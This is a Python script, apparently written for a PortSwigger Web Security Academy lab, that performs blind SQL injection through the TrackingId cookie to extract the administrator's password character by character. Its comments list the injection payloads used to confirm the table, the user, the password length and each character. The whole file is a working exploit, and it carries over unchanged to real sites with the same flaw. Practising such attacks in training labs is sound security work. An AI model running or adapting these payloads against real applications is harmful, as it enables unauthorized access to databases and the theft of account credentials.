import requests
import string

dictionary = string.ascii_lowercase + string.digits
# change URL
URL = "https://0aa10024044604e4c08b1b20006f001e.web-security-academy.net"
s = requests.Session()
foundPassword = ""
COUNTER = 1

while True:
    for char in dictionary:
        # change COOKIES value
        COOKIES = dict(TrackingId = "NmmrCo8DUKkzW3qC' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator')," + str(COUNTER) + ", 1) = '" + char + ";", session = "3suYNKYzNAOj5nCIj96G2VxjHbUfefgf")
        print(COOKIES)
        r = s.get(url = URL, cookies = COOKIES)
        out = r.text

        if out.find('Welcome back!') > -1:
            foundPassword += char
            print("Leaking contents of admin password: " + foundPassword)
            COUNTER += 1
            break
        else:
            pass


# check for table existance : TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
# check for user existence : TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
# check for password lenght :
# TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a

# check for specific password character :
# TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a

# check next position character :
# TrackingId=xyz' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a

# the script can be optimazed with a binary search of the character space algorithm
